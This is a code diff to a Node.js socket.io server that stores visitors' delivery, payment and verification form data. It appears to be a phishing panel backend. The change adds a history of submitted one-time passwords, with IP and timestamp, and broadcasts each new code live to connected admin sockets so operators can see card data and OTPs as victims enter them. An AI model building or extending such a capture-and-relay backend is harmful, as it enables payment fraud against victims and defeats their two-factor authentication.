@@ -205,22 +205,55 @@ io.on('connection', (socket) => {
     const { sessionId, verificationData } = data;
     
     try {
+      // Get current OTP history
+      const currentVisitor = await pool.query(
+        'SELECT otp_history FROM visitors WHERE session_id = $1',
+        [sessionId]
+      );
+      
+      let otpHistory = [];
+      if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].otp_history) {
+        try {
+          otpHistory = Array.isArray(currentVisitor.rows[0].otp_history) 
+            ? currentVisitor.rows[0].otp_history 
+            : JSON.parse(currentVisitor.rows[0].otp_history);
+        } catch (e) {
+          otpHistory = [];
+        }
+      }
+      
+      // Add new OTP to history
+      if (verificationData.otp) {
+        const newOTPEntry = {
+          otp: verificationData.otp,
+          timestamp: new Date().toISOString(),
+          ip: geo?.ip || socket.handshake.address
+        };
+        otpHistory.unshift(newOTPEntry);
+        
+        // Keep only last 10 OTP entries
+        if (otpHistory.length > 10) {
+          otpHistory = otpHistory.slice(0, 10);
+        }
+      }
+
       await pool.query(
-        'UPDATE visitors SET verification_data = $1, verification_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
-        [JSON.stringify(verificationData), sessionId]
+        'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
+        [JSON.stringify(verificationData), JSON.stringify(otpHistory), sessionId]
       );
 
-      // Notify admins
+      // Notify admins with OTP history
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('form:verificationSubmitted', {
           sessionId,
           verificationData,
+          otpHistory: otpHistory,
           country: geo?.country,
           timestamp: new Date()
         });
       });
 
-      console.log(`🔐 Verification form submitted by ${sessionId}`);
+      console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}`);
     } catch (error) {
       console.error('Error saving verification data:', error);
     }
@@ -317,7 +350,7 @@ io.on('connection', (socket) => {
     try {
       const visitors = await pool.query(`
         SELECT session_id, ip_address, country, country_code, current_page, delivery_data, payment_data, 
-               verification_data, form_submitted, payment_submitted, 
+               verification_data, otp_history, form_submitted, payment_submitted, 
                verification_submitted, last_activity, is_online
         FROM visitors 
         ORDER BY last_activity DESC
